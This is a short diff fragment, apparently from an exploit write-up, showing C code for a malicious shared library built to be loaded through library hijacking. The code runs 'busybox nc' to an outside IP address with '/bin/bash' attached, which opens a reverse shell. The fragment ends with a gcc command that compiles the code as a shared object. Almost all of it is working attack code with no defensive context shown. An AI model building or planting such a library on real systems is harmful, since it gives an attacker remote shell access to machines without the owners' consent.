@@ -191,6 +191,7 @@ void advance_backup_custom_implementation() {
  printf("Reverse Shell via library hijacking... \n");  
  const char *ncshell = "busybox nc 192.168.45.197 80 -e /bin/bash";  
  system(ncshell);  
+}
 
 Exploitation :
 gcc -shared -fPIC -o lib_backup.so lib_backup.c
